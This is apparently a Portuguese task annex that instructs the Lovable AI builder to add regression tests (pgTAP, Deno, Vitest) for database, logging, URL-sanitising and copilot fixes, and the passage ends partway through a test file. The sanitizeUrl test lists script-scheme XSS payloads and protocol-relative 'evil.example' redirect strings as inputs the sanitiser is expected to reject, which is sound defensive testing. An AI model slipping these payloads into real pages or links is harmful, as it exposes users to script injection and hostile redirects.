# PROMPT LOVABLE — RC12 · ANEXO T — Testes novos e documentos

Testes (pgTAP, Deno, Vitest) que falham no código original e passam depois das correções, e a documentação de operação atualizada. **Opcional**, mas recomendado: protege as correções contra regressões. Aplicar depois do pacote essencial.

## Regras (valem para esta parte)
1. Aplique TUDO o que está nesta parte e NADA mais. Não refatore, não renomeie, não "melhore" o que não é descrito.
2. Cada secção traz o diff exato (`diff -U2`, números de linha do ficheiro ORIGINAL, que é o que você tem agora). Se um diff não aplicar porque o ficheiro já mudou, **pare nessa secção e diga qual**; não improvise outra solução.
3. "Criar `caminho`" = ficheiro novo com o conteúdo exato. "Apagar" = remover o ficheiro.
4. Migrações SQL: crie-as em `supabase/migrations/` com o nome indicado, pela ordem dos nomes. Correm numa transação (sem `CONCURRENTLY`). São idempotentes. Várias começam por um bloco `DO $guard$` que **aborta de propósito** se a função real tiver divergido da definição de partida: se isso acontecer, **pare e devolva o `md5` e o resultado de `pg_get_functiondef` dessa função**; nunca desative o guarda nem reescreva a função por conta própria.
5. Nunca edite migrações que já existem, nem `src/integrations/supabase/types.ts` (é regenerado depois de cada migração).
6. Edge functions: depois de aplicar, publique as que foram alteradas e todas as que importam um `_shared/*` alterado.
7. Texto de UI: use as chaves `t('chave', 'texto PT')` dos diffs. As chaves novas estão no anexo `LOVABLE-RC12-I18N-PATCH.json` (aplicado uma vez, na Parte 1 do pacote essencial).
8. No fim, responda com: (a) a lista de secções aplicadas, (b) o que não aplicou e porquê, (c) qualquer erro de compilação ou de migração, com o texto exato.

---

### `supabase/tests/rc12_sql_db_conflict_targets.test.sql`
_(de: Upserts e publicação de programas falham com 42P10 (índices únicos parciais) (ids: DBP-01, DBP-02, SCH-01, DBP-03, SCH-13))_

**Criar `supabase/tests/rc12_sql_db_conflict_targets.test.sql`** (conteúdo exato):

```sql
-- RC12 (sql_db) · DBP-01/02/03, SCH-01/13 (alvos de ON CONFLICT) + DBP-05/06/08 (indices)
-- Falha antes de 20261103200000_rc12_conflict_targets.sql e 20261103201000_rc12_indexes_cleanup.sql; passa depois.
BEGIN;
SELECT plan(16);

-- ---- fixtures -------------------------------------------------------------
INSERT INTO auth.users (id, email, email_confirmed_at) VALUES
  ('a1200000-0000-4000-8000-000000000001', 'rc12-sqldb-a@test.local', now());
INSERT INTO public.profiles (id, email, full_name, account_status)
VALUES ('a1200000-0000-4000-8000-000000000001', 'rc12-sqldb-a@test.local', 'RC12 A', 'approved')
ON CONFLICT (id) DO UPDATE SET account_status = 'approved';
INSERT INTO public.programs (id, name) VALUES ('e1200000-0000-4000-8000-00000000000e', 'Programa RC12 sql_db');
INSERT INTO public.program_setup_drafts (id, program_id, created_by, draft_json)
VALUES ('f1200000-0000-4000-8000-0000000000f1', 'e1200000-0000-4000-8000-00000000000e', 'a1200000-0000-4000-8000-000000000001', '{}');

-- ---- 1) os tres indices deixam de ser parciais -----------------------------
SELECT is((SELECT indpred IS NULL AND indisunique FROM pg_index WHERE indexrelid = 'public.notifications_event_key_user_unique'::regclass),
          true, 'DBP-02: notifications_event_key_user_unique e UNIQUE completo');
SELECT is((SELECT indpred IS NULL AND indisunique FROM pg_index WHERE indexrelid = 'public.stages_program_stage_key_unique'::regclass),
          true, 'DBP-01: stages_program_stage_key_unique e UNIQUE completo');
SELECT is((SELECT indpred IS NULL AND indisunique FROM pg_index WHERE indexrelid = 'public.idx_communication_log_external_dedupe'::regclass),
          true, 'DBP-03: idx_communication_log_external_dedupe e UNIQUE completo');

-- ---- 2) ON CONFLICT sem predicado (o que o PostgREST emite) --------------------
SELECT lives_ok($$INSERT INTO public.notifications (user_id, type, title, event_key)
  VALUES ('a1200000-0000-4000-8000-000000000001', 't', 'n', 'rc12:k1') ON CONFLICT (user_id, event_key) DO NOTHING$$,
  'DBP-02: upsert de notificacao (user_id,event_key) sem predicado nao da 42P10');
SELECT lives_ok($$INSERT INTO public.notifications (user_id, type, title, event_key)
  VALUES ('a1200000-0000-4000-8000-000000000001', 't', 'n', 'rc12:k1') ON CONFLICT (user_id, event_key) DO NOTHING$$,
  'DBP-02: repetir o upsert continua a nao dar erro');
SELECT is((SELECT count(*)::int FROM public.notifications WHERE event_key = 'rc12:k1'), 1, 'DBP-02: o upsert repetido nao duplica');
SELECT lives_ok($$INSERT INTO public.notifications (user_id, type, title, event_key)
  VALUES ('a1200000-0000-4000-8000-000000000001', 't', 'n', 'rc12:k1') ON CONFLICT (user_id, event_key) WHERE event_key IS NOT NULL DO NOTHING$$,
  'SCH-01: a forma com predicado (funcoes SQL existentes) continua valida');
SELECT throws_ok($$INSERT INTO public.notifications (user_id, type, title, event_key)
  VALUES ('a1200000-0000-4000-8000-000000000001', 't', 'n', 'rc12:k1')$$, '23505', NULL, 'SCH-01: INSERT duplicado simples continua a dar 23505');

SELECT lives_ok($$INSERT INTO public.communication_log (activity_type, channel, subject, occurred_at, external_source, external_id)
  VALUES ('email', 'email', 's', now(), 'ms_graph', 'rc12-m1') ON CONFLICT (external_source, external_id) DO NOTHING$$,
  'SCH-13: upsert (external_source,external_id) sem predicado nao da 42P10');
SELECT hasnt_index('public', 'communication_log', 'idx_communication_log_external_dedup', 'DBP-06: indice unico duplicado removido (1)');
SELECT hasnt_index('public', 'communication_log', 'uniq_communication_log_external', 'DBP-06: indice unico duplicado removido (2)');

-- ---- 3) publish_program_setup com etapas ----------------------------------------
SELECT set_config('role', 'service_role', true);
SELECT set_config('request.jwt.claims', '{"role":"service_role"}', true);
SELECT lives_ok($$SELECT public.publish_program_setup('f1200000-0000-4000-8000-0000000000f1', 'e1200000-0000-4000-8000-00000000000e',
  '{"basics":{"program_type":"incubation","name":"P"},"stages":[{"stage_key":"ideation","name":"Ideia","position":1,"is_active":true}]}'::jsonb,
  '{}'::jsonb)$$, 'DBP-01: publish_program_setup com etapas nao rebenta com 42P10');
SELECT set_config('role', 'postgres', true);
SELECT set_config('request.jwt.claims', '', true);
SELECT is((SELECT count(*)::int FROM public.stages WHERE program_id = 'e1200000-0000-4000-8000-00000000000e' AND stage_key = 'ideation'), 1,
  'DBP-01: a etapa foi criada');

-- ---- 4) DBP-08 / DBP-05 -------------------------------------------------------------
SELECT hasnt_index('public', 'client_error_logs', 'idx_client_error_logs_message', 'DBP-08: sem btree sobre o texto livre message');
SELECT lives_ok($$INSERT INTO public.client_error_logs (error_id, message)
  SELECT 'rc12-big', string_agg(md5(g::text), '') FROM generate_series(1, 200) g$$,
  'DBP-08: mensagem de erro grande (~6 KB) ja pode ser registada');
SELECT ok(EXISTS (SELECT 1 FROM pg_index i JOIN pg_attribute a ON a.attrelid = i.indrelid AND a.attnum = i.indkey[0]
                   WHERE i.indrelid = 'public.milestones'::regclass AND a.attname = 'workspace_id' AND i.indisvalid)
          AND EXISTS (SELECT 1 FROM pg_index i JOIN pg_attribute a ON a.attrelid = i.indrelid AND a.attnum = i.indkey[0]
                       WHERE i.indrelid = 'public.workspace_users'::regclass AND a.attname = 'user_id' AND i.indisvalid),
          'DBP-05: milestones(workspace_id) e workspace_users(user_id) tem indice de suporte');

SELECT * FROM finish();
ROLLBACK;
```

### `src/lib/queryCount.test.ts`
_(de: Contagens do shell fabricam zeros quando a consulta falha (ids: HRD-05, FEX-09))_

**Criar `src/lib/queryCount.test.ts`** (conteúdo exato):

```
import { describe, it, expect } from 'vitest';
import { countOrNull, countOrThrow } from '@/lib/queryCount';

describe('countOrThrow', () => {
  it('returns the count when the query succeeded', () => {
    expect(countOrThrow({ count: 0, error: null })).toBe(0);
    expect(countOrThrow({ count: 7, error: null })).toBe(7);
  });
  it('throws instead of fabricating a zero', () => {
    const err = { message: 'boom' };
    expect(() => countOrThrow({ count: null, error: err })).toThrow();
    expect(() => countOrThrow({ count: null, error: null })).toThrow('count_unavailable');
    expect(() => countOrThrow({ count: 3, error: { message: '' } })).toThrow();
  });
});

describe('countOrNull', () => {
  it('returns null for rejected, errored or null-count results', () => {
    expect(countOrNull({ status: 'rejected', reason: new Error('x') })).toBeNull();
    expect(countOrNull({ status: 'fulfilled', value: { count: null, error: null } })).toBeNull();
    expect(countOrNull({ status: 'fulfilled', value: { count: 4, error: { message: 'x' } } })).toBeNull();
  });
  it('returns the count otherwise (including 0)', () => {
    expect(countOrNull({ status: 'fulfilled', value: { count: 0, error: null } })).toBe(0);
    expect(countOrNull({ status: 'fulfilled', value: { count: 5, error: null } })).toBe(5);
  });
});
```

### `src/hooks/useAttentionCount.test.tsx`
_(de: Contagens do shell fabricam zeros quando a consulta falha (ids: HRD-05, FEX-09))_

**Criar `src/hooks/useAttentionCount.test.tsx`** (conteúdo exato):

```
import { renderHook, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import type { ReactNode } from 'react';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const state = vi.hoisted(() => ({
  overdue: { count: 3 as number | null, error: null as unknown },
  inCalls: [] as string[][],
}));

vi.mock('@/contexts/AuthContext', () => ({
  useAuth: () => ({ user: { id: 'u1' }, isAdmin: true, isConsultor: false }),
}));

vi.mock('@/lib/supabaseClient', () => {
  const workspaces = Array.from({ length: 250 }, (_, i) => ({ id: `ws-${i}`, health_score: i < 2 ? 'critical' : 'ok', health_score_override: null }));
  const builder = (table: string) => {
    const b: Record<string, unknown> = {};
    const self = () => b;
    b.select = self; b.eq = self; b.limit = self; b.lt = self;
    b.in = (col: string, vals: string[]) => { if (col === 'workspace_id') state.inCalls.push(vals); return b; };
    b.then = (resolve: (v: unknown) => unknown) =>
      resolve(table === 'workspaces' ? { data: workspaces, error: null } : { ...state.overdue, data: null });
    return b;
  };
  return { supabase: { from: (table: string) => builder(table) } };
});

import { useAttentionCount } from './useAttentionCount';

const wrapper = ({ children }: { children: ReactNode }) => {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return <QueryClientProvider client={qc}>{children}</QueryClientProvider>;
};

describe('useAttentionCount', () => {
  beforeEach(() => { state.overdue = { count: 3, error: null }; state.inCalls = []; });

  it('chunks the workspace ids and sums the overdue counts', async () => {
    const { result } = renderHook(() => useAttentionCount(), { wrapper });
    await waitFor(() => expect(result.current.isSuccess).toBe(true));
    expect(state.inCalls.filter((c) => c.length > 0).every((c) => c.length <= 100)).toBe(true);
    expect(state.inCalls.length).toBe(3); // 250 ids -> 100 + 100 + 50
    expect(result.current.data?.overdueCount).toBe(9);
    expect(result.current.data?.criticalCount).toBe(2);
  });

  it('errors instead of showing zero overdue items when the count fails', async () => {
    state.overdue = { count: null, error: { message: 'boom' } };
    const { result } = renderHook(() => useAttentionCount(), { wrapper });
    await waitFor(() => expect(result.current.isError).toBe(true));
    expect(result.current.data).toBeUndefined();
  });
});
```

### `src/lib/sanitizeUrl.test.ts`
_(de: `sanitizeUrl` aceita URLs protocolo-relativas (ids: FEX-14))_

**Criar `src/lib/sanitizeUrl.test.ts`** (conteúdo exato):

```
import { describe, it, expect } from 'vitest';
import { sanitizeUrl, safeExternalHref } from '@/lib/sanitizeUrl';

describe('sanitizeUrl / safeExternalHref', () => {
  it.each([
    'javascript:alert(document.domain)',
    ' JaVaScRiPt:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
  ])('rejects script-bearing scheme %s', (u) => {
    expect(safeExternalHref(u)).toBeUndefined();
    expect(sanitizeUrl(u)).toBeUndefined();
  });

  it.each(['//evil.example/x', '/\\evil.example/x', '/\t/evil.example', '/\n/evil.example', '/\r/evil.example'])(
    'rejects protocol-relative or control-character path %j',
    (u) => {
      expect(sanitizeUrl(u)).toBeUndefined();
    },
  );

  it('accepts http(s), mailto and in-app paths; adds https:// to bare hosts', () => {
    expect(safeExternalHref('https://www.linkedin.com/in/x')).toBe('https://www.linkedin.com/in/x');
    expect(safeExternalHref('linkedin.com/in/x')).toBe('https://linkedin.com/in/x');
    expect(sanitizeUrl('mailto:a@b.pt')).toBe('mailto:a@b.pt');
    expect(sanitizeUrl('/workspace/1?tab=kpis')).toBe('/workspace/1?tab=kpis');
    expect(sanitizeUrl('/my-workspaces#session-prep')).toBe('/my-workspaces#session-prep');
    expect(safeExternalHref(null)).toBeUndefined();
    expect(safeExternalHref('   ')).toBeUndefined();
  });
});
```

### `src/lib/logError.redact.test.ts`
_(de: URL completo com tokens gravado em `client_error_logs` e `bug_reports` (ids: FEX-13, HRD-11))_

**Criar `src/lib/logError.redact.test.ts`** (conteúdo exato):

```
import { describe, it, expect } from 'vitest';
import { redactPathForLogs, redactUrlForLogs } from '@/lib/logError';

describe('redactUrlForLogs', () => {
  it('removes path tokens of public routes, token-like params and the hash', () => {
    expect(redactUrlForLogs('https://app.test/contract-signing/abc123?x=1#access_token=zzz'))
      .toBe('https://app.test/contract-signing/[redacted]?x=1');
    expect(redactUrlForLogs('https://app.test/reset-password?token_hash=SECRET&type=recovery'))
      .toBe('https://app.test/reset-password?token_hash=%5Bredacted%5D&type=recovery');
    expect(redactUrlForLogs('https://app.test/accept-invite?token=abc'))
      .toBe('https://app.test/accept-invite?token=%5Bredacted%5D');
    expect(redactUrlForLogs('https://app.test/dataroom/shared/tok/extra'))
      .toBe('https://app.test/dataroom/shared/[redacted]/extra');
    expect(redactUrlForLogs('https://app.test/share/tok')).toBe('https://app.test/share/[redacted]');
    expect(redactUrlForLogs('https://app.test/workspace/1?tab=kpis')).toBe('https://app.test/workspace/1?tab=kpis');
  });

  it('never throws', () => {
    expect(redactUrlForLogs('not a url')).toBe('unknown');
  });
});

describe('redactPathForLogs', () => {
  it.each(['share', 'book', 'survey', 'contract-signing', 'contract-intake', 'dataroom/shared'])('redacts /%s/:token', (p) => {
    expect(redactPathForLogs(`/${p}/secret-token`)).toBe(`/${p}/[redacted]`);
  });
  it('keeps ordinary routes', () => {
    expect(redactPathForLogs('/workspace/123')).toBe('/workspace/123');
    expect(redactPathForLogs('/shared-docs/abc')).toBe('/shared-docs/abc');
  });
});
```

### `supabase/functions/_shared/loggerContext_test.ts`
_(de: Contas suspensas ou pendentes continuam a operar com service role (ids: HRD-02, ED4-09, ED1-03, HRD-15))_

**Criar `supabase/functions/_shared/loggerContext_test.ts`** (conteúdo exato):

```
import { assertEquals } from 'https://deno.land/std@0.224.0/assert/mod.ts';
import { createLogger, denyIfAccountInactive } from './security.ts';

function captureError(fn: (log: ReturnType<typeof createLogger>) => void): Record<string, unknown> {
  const lines: string[] = [];
  const real = console.error;
  console.error = (line: unknown) => { lines.push(String(line)); };
  try { fn(createLogger('t', 'req_1')); } finally { console.error = real; }
  return JSON.parse(lines[0]);
}

Deno.test('logger.error logs the fields of a context object instead of [object Object]', () => {
  const out = captureError((log) => log.error('AI gateway error', { status: 429, errText: 'rate limited' }));
  assertEquals(out.status, 429);
  assertEquals(out.errText, 'rate limited');
  assertEquals(out.level, 'error');
  assertEquals(out.msg, 'AI gateway error');
  assertEquals(out.errMsg, 'see fields');
});

Deno.test('logger.error keeps Error, string and message-bearing objects readable', () => {
  assertEquals(captureError((log) => log.error('x', new Error('boom'))).errMsg, 'boom');
  assertEquals(captureError((log) => log.error('x', 'plain')).errMsg, 'plain');
  assertEquals(captureError((log) => log.error('x', { message: 'pg failed', code: '42P10' })).errMsg, 'pg failed');
  assertEquals('errMsg' in captureError((log) => log.error('x')), false);
});

Deno.test('logger.error context cannot overwrite level/msg', () => {
  const out = captureError((log) => log.error('real', { msg: 'fake', level: 'info' }));
  assertEquals(out.msg, 'real');
  assertEquals(out.level, 'error');
});

Deno.test('denyIfAccountInactive: 403 for inactive, null for active', async () => {
  const req = new Request('https://local.test');
  const client = (ok: boolean) => ({ rpc: () => Promise.resolve({ data: ok, error: null }) }) as never;
  assertEquals(await denyIfAccountInactive(req, client(true), 'u1'), null);
  const res = await denyIfAccountInactive(req, client(false), 'u1');
  assertEquals(res?.status, 403);
});
```

### `supabase/functions/_shared/copilotInput_test.ts`
_(de: Copilot: respostas cortadas, histórico bloqueado por uma resposta longa e papéis lidos de texto controlável (ids: HRD-07, ED3-12, ED3-13, ED3-14, FES-15, FES-14 e FEX-15 só na parte de GlobalEcosystemCopilot.tsx))_

**Alterar `supabase/functions/_shared/copilotInput_test.ts`** (diff; os números de linha são do ficheiro original):

```diff
--- a/supabase/functions/_shared/copilotInput_test.ts
+++ b/supabase/functions/_shared/copilotInput_test.ts
@@ -32,3 +32,21 @@ Deno.test('invalid content and empty histories are rejected', () => {
     assertThrows(() => parseCopilotMessages(value), Error, 'invalid_messages');
   }
-});
\ No newline at end of file
+});
+Deno.test('long assistant replies are truncated instead of blocking the conversation', () => {
+  const messages = parseCopilotMessages([
+    { role: 'user', content: 'Expand the playbook.' },
+    { role: 'assistant', content: 'a'.repeat(9000) },
+    { role: 'user', content: 'Thanks, one more question.' },
+  ]);
+  assertEquals(messages.length, 3);
+  assertEquals(messages[1].content.includes('a'.repeat(4000)), true);
+  assertEquals(messages[1].content.includes('a'.repeat(4001)), false);
+});
+Deno.test('only the last 20 messages are forwarded and over-long user messages are still rejected', () => {
+  const history = Array.from({ length: 30 }, (_, i) => ({ role: 'user', content: `m${i}` }));
+  const messages = parseCopilotMessages(history);
+  assertEquals(messages.length, 20);
+  assertEquals(messages[0].content, 'm10');
+  assertEquals(messages[19].content, 'm29');
+  assertThrows(() => parseCopilotMessages([{ role: 'user', content: 'x'.repeat(4001) }]), Error, 'invalid_messages');
+});
```

### `supabase/functions/_shared/auditEndpoint_test.ts`
_(de: Copilot: respostas cortadas, histórico bloqueado por uma resposta longa e papéis lidos de texto controlável (ids: HRD-07, ED3-12, ED3-13, ED3-14, FES-15, FES-14 e FEX-15 só na parte de GlobalEcosystemCopilot.tsx))_

**Alterar `supabase/functions/_shared/auditEndpoint_test.ts`** (diff; os números de linha são do ficheiro original):

```diff
--- a/supabase/functions/_shared/auditEndpoint_test.ts
+++ b/supabase/functions/_shared/auditEndpoint_test.ts
@@ -27,5 +27,5 @@ async function loadHandler(name: string, client: unknown, providerFetch: typeof
 }
 
-function fixture(account: boolean | null, accountError: boolean, options: { workspaceError?: boolean; roleError?: boolean } = {}) {
+function fixture(account: boolean | null, accountError: boolean, options: { workspaceError?: boolean; roleError?: boolean; rateLimitError?: boolean } = {}) {
   const operations: string[] = [];
   const chain = (table: string) => {
@@ -47,5 +47,5 @@ function fixture(account: boolean | null, accountError: boolean, options: { work
     rpc: (name: string) => {
       operations.push(name);
-      return Promise.resolve({ data: name === 'is_account_active' ? account : true, error: name === 'is_account_active' && accountError || name === 'is_admin' && options.roleError ? { message: 'offline' } : null });
+      return Promise.resolve({ data: name === 'is_account_active' ? account : true, error: name === 'is_account_active' && accountError || name === 'is_admin' && options.roleError || name === 'check_ai_rate_limit' && options.rateLimitError ? { message: 'offline' } : null });
     },
   };
@@ -91,6 +91,6 @@ Deno.test('copilot: approved pre-workspace user retains ordinary history without
   await response.text();
 });
-Deno.test('copilot: workspace lookup error fails closed rather than treating failure as no membership', async () => {
-  const f = fixture(true, false, { workspaceError: true });
+Deno.test('copilot: rate-limit lookup error fails closed rather than allowing the request', async () => {
+  const f = fixture(true, false, { rateLimitError: true });
   let calls = 0;
   const handler = await loadHandler('copilot-chat', f.client, () => { calls++; throw new Error('unexpected provider call'); });
```

### `src/hooks/useCopilotChat.test.ts`
_(de: Copilot: respostas cortadas, histórico bloqueado por uma resposta longa e papéis lidos de texto controlável (ids: HRD-07, ED3-12, ED3-13, ED3-14, FES-15, FES-14 e FEX-15 só na parte de GlobalEcosystemCopilot.tsx))_

**Criar `src/hooks/useCopilotChat.test.ts`** (conteúdo exato):

```
import { describe, it, expect, vi } from 'vitest';

vi.mock('@/lib/supabaseClient', () => ({ supabase: {}, supabaseClient: {} }));

import { prepareCopilotHistory } from './useCopilotChat';

describe('prepareCopilotHistory', () => {
  it('envia só as últimas 20 mensagens', () => {
    const msgs = Array.from({ length: 30 }, (_, i) => ({ role: 'user' as const, content: `m${i}` }));
    const out = prepareCopilotHistory(msgs);
    expect(out).toHaveLength(20);
    expect(out[0].content).toBe('m10');
    expect(out[19].content).toBe('m29');
  });

  it('limita cada mensagem a 4000 caracteres (uma resposta longa não bloqueia a conversa)', () => {
    const out = prepareCopilotHistory([
      { role: 'user', content: 'Expanda o playbook' },
      { role: 'assistant', content: 'a'.repeat(9000) },
      { role: 'user', content: 'Obrigado' },
    ]);
    expect(out[1].content).toHaveLength(4000);
    expect(out[2].content).toBe('Obrigado');
  });

  it('não envia campos extra (id)', () => {
    const out = prepareCopilotHistory([{ id: 'x', role: 'user', content: 'olá' } as any]);
    expect(out).toEqual([{ role: 'user', content: 'olá' }]);
  });
});
```

### `src/components/admin/__tests__/failedReads.rc12.test.tsx`
_(de: Separador "Espaços" do Backoffice abre a Visão Geral (ids: FEB-02))_

**Criar `src/components/admin/__tests__/failedReads.rc12.test.tsx`** (conteúdo exato):

```
import { renderHook, waitFor, render, screen } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { createElement, type ReactNode } from 'react';
import { describe, expect, it, vi } from 'vitest';
import { MemoryRouter } from 'react-router-dom';

// every table read fails (RLS / timeout / network): supabase-js returns {data:null,error}
vi.mock('@/lib/supabaseClient', () => {
  const mk = () => {
    const chain: any = new Proxy(function () {}, {
      get: (_t, p) => {
        if (p === 'then') return (res: any) => Promise.resolve({ data: null, count: null, error: { message: 'boom' } }).then(res);
        return chain;
      },
      apply: () => chain,
    });
    return chain;
  };
  return { supabase: { from: () => mk(), rpc: () => mk(), auth: { getUser: async () => ({ data: { user: null } }) } } };
});
vi.mock('@/contexts/AuthContext', () => ({
  useAuth: () => ({ isAdmin: false, isBackoffice: true, isConsultor: false, isStaff: true, user: { id: 'u' }, profile: { full_name: 'X' } }),
}));
vi.mock('@/hooks/useWorkspaces', () => ({ usePrograms: () => ({ data: [] }), useWorkspaces: () => ({ data: [] }) }));
vi.mock('@/hooks/useWorkspaceMomentum', () => ({ useWorkspaceMomentum: () => [] }));

import { useBackofficeCommandCenter } from '@/hooks/useBackofficeCommandCenter';
import { PendingApprovalsManager } from '@/components/admin/PendingApprovalsManager';
import { EcosystemPulseCard } from '@/components/admin/EcosystemPulseCard';
import { FounderNotificationsKillSwitch } from '@/components/admin/FounderNotificationsKillSwitch';

const qc = () => new QueryClient({ defaultOptions: { queries: { retry: false } } });
const wrap = ({ children }: { children: ReactNode }) => createElement(QueryClientProvider, { client: qc() }, createElement(MemoryRouter, null, children));

describe('failed reads are presented as real zeros / empty states', () => {
  it('useBackofficeCommandCenter: failed reads are an error, not zeros', async () => {
    const { result } = renderHook(useBackofficeCommandCenter, { wrapper: wrap });
    await waitFor(() => expect(result.current.isError).toBe(true));
    expect(result.current.data).toBeUndefined();
  });
  it('PendingApprovalsManager: failed reads show an error alert, not the empty state', async () => {
    render(createElement(wrap, null, createElement(PendingApprovalsManager)));
    await waitFor(() => expect(screen.queryByRole('alert')).not.toBeNull());
    expect(document.body.textContent).not.toMatch(/noPendingApprovals|Sem Candidaturas Pendentes|No Pending/);
  });
  it('EcosystemPulseCard: failed counts render a dash', async () => {
    render(createElement(wrap, null, createElement(EcosystemPulseCard)));
    await waitFor(() => expect(document.querySelectorAll('p.text-2xl').length).toBe(4));
    expect(Array.from(document.querySelectorAll('p.text-2xl')).map(e => e.textContent)).toEqual(['—','—','—','—']);
  });
  it('FounderNotificationsKillSwitch: failed read shows an error, not an OFF switch', async () => {
    render(createElement(wrap, null, createElement(FounderNotificationsKillSwitch)));
    await screen.findByRole('alert');
    expect(screen.queryByRole('switch')).toBeNull();
  });
});
```

### `src/components/admin/__tests__/AdminContracts.rc12.test.tsx`
_(de: Separador "Espaços" do Backoffice abre a Visão Geral (ids: FEB-02))_

**Criar `src/components/admin/__tests__/AdminContracts.rc12.test.tsx`** (conteúdo exato):

```
import { render, screen, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { describe, expect, it, vi } from 'vitest';
import { MemoryRouter } from 'react-router-dom';
import '@/i18n';

const state = vi.hoisted(() => ({ fail: true, total: 1200 }));

vi.mock('@/lib/supabaseClient', () => ({
  supabase: {
    from: () => {
      let from = 0;
      let to = 999;
      const chain: Record<string, unknown> = {};
      for (const method of ['select', 'order', 'eq']) chain[method] = () => chain;
      chain.range = (f: number, t: number) => { from = f; to = Math.min(t, f + 999); return chain; };
      chain.then = (resolve: (value: unknown) => unknown) => {
        if (state.fail) return Promise.resolve({ data: null, error: { message: 'boom' } }).then(resolve);
        const n = Math.max(0, Math.min(to, state.total - 1) - from + 1);
        const data = Array.from({ length: n }, (_, i) => ({
          id: `c-${from + i}`, contract_number: `N-${from + i}`, status: 'pending_signature', workspace_id: null,
          created_at: '2026-01-01T00:00:00Z', organization_name: `Org ${from + i}`, company_nif: null, workspaces: null,
        }));
        return Promise.resolve({ data, error: null }).then(resolve);
      };
      return chain;
    },
  },
}));
vi.mock('@/components/layout/AppLayout', () => ({ AppLayout: ({ children }: { children: React.ReactNode }) => <div>{children}</div> }));

import AdminContracts from '@/pages/AdminContracts';

const renderPage = () => {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(<QueryClientProvider client={qc}><MemoryRouter><AdminContracts /></MemoryRouter></QueryClientProvider>);
};

describe('AdminContracts', () => {
  it('shows a retryable error instead of "no contracts" when the read fails', async () => {
    state.fail = true;
    renderPage();
    await screen.findByRole('alert');
    expect(document.body.textContent).not.toMatch(/Sem contratos|No contracts/);
  });

  it('lists every contract (not just 500 or the 1000-row response cap)', async () => {
    state.fail = false;
    renderPage();
    await waitFor(() => expect(document.querySelectorAll('tbody tr').length).toBe(1200));
  });
});
```

### `src/hooks/useSessionActionItems.test.tsx`
_(de: Hrefs e `window.open` com URLs escritas por utilizadores (ids: FEB-01, FEX-01, FES-08, FEF-09))_

**Criar `src/hooks/useSessionActionItems.test.tsx`** (conteúdo exato):

```
import { createElement, type ReactNode } from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { renderHook, waitFor } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

const calls: Array<{ table: string; select: string }> = [];
vi.mock('@/lib/supabaseClient', () => ({
  supabase: {
    from: (table: string) => {
      const chain: Record<string, unknown> = {};
      chain.select = (cols: string) => {
        calls.push({ table, select: cols });
        // Simula o PostgREST real: um embed `profiles!action_items_owner_user_id_fkey` falha com PGRST200.
        if (table === 'action_items' && cols.includes('profiles!')) {
          chain.__error = { code: 'PGRST200', message: 'Could not find a relationship between action_items and profiles' };
        }
        return chain;
      };
      for (const m of ['eq', 'in', 'order']) chain[m] = () => chain;
      chain.then = (resolve: (v: unknown) => unknown) => {
        if (chain.__error) return Promise.resolve({ data: null, error: chain.__error }).then(resolve);
        const data = table === 'action_items'
          ? [{ id: 'a1', title: 'T', owner_user_id: 'u1', status: 'pending' }, { id: 'a2', title: 'U', owner_user_id: null, status: 'pending' }]
          : [{ id: 'u1', full_name: 'Ana', avatar_url: null }];
        return Promise.resolve({ data, error: null }).then(resolve);
      };
      return chain;
    },
  },
}));

import { useSessionActionItems } from './useSessions';

function wrapper({ children }: { children: ReactNode }) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return createElement(QueryClientProvider, { client }, children);
}

describe('useSessionActionItems', () => {
  it('não usa o embed inexistente profiles!action_items_owner_user_id_fkey e devolve o dono', async () => {
    const { result } = renderHook(() => useSessionActionItems('s1'), { wrapper });
    await waitFor(() => expect(result.current.isSuccess).toBe(true));
    expect(calls.some(c => c.select.includes('profiles!'))).toBe(false);
    expect(result.current.data?.map(a => a.owner?.full_name ?? null)).toEqual(['Ana', null]);
  });
});
```

### `src/hooks/useExportActions.rc12.test.tsx`
_(de: Hrefs e `window.open` com URLs escritas por utilizadores (ids: FEB-01, FEX-01, FES-08, FEF-09))_

**Criar `src/hooks/useExportActions.rc12.test.tsx`** (conteúdo exato):

```
import { createElement, type ReactNode } from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { renderHook } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

const calls: Array<{ table: string; select: string }> = [];
vi.mock('@/lib/supabaseClient', () => ({
  supabase: {
    from: (table: string) => {
      const chain: Record<string, unknown> = {};
      chain.select = (cols: string) => {
        calls.push({ table, select: cols });
        // Simula o PostgREST real: o embed `profiles!action_items_owner_user_id_fkey` não existe (PGRST200).
        if (table === 'action_items' && cols.includes('profiles!')) {
          chain.__error = { code: 'PGRST200', message: 'Could not find a relationship between action_items and profiles' };
        }
        return chain;
      };
      for (const m of ['eq', 'in', 'order']) chain[m] = () => chain;
      chain.then = (resolve: (v: unknown) => unknown) => {
        if (chain.__error) return Promise.resolve({ data: null, error: chain.__error }).then(resolve);
        const data = table === 'action_items'
          ? [
              { title: 'A', description: null, status: 'pending', priority: null, due_date: null, created_at: '2026-01-01', completed_at: null, owner_user_id: 'u1' },
              { title: 'B', description: null, status: 'pending', priority: null, due_date: null, created_at: '2026-01-02', completed_at: null, owner_user_id: 'u2' },
              { title: 'C', description: null, status: 'pending', priority: null, due_date: null, created_at: '2026-01-03', completed_at: null, owner_user_id: null },
            ]
          : [{ id: 'u1', full_name: 'Ana', email: 'ana@x.pt' }, { id: 'u2', full_name: null, email: 'rui@x.pt' }];
        return Promise.resolve({ data, error: null }).then(resolve);
      };
      return chain;
    },
  },
}));

import { useExportActions } from './useExportData';

function wrapper({ children }: { children: ReactNode }) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return createElement(QueryClientProvider, { client }, children);
}

describe('useExportActions', () => {
  it('não usa o embed inexistente e resolve o dono por profiles_safe (nome, depois email, depois null)', async () => {
    calls.length = 0;
    const { result } = renderHook(() => useExportActions('w1'), { wrapper });
    const res = await result.current.refetch();
    expect(res.error).toBeNull();
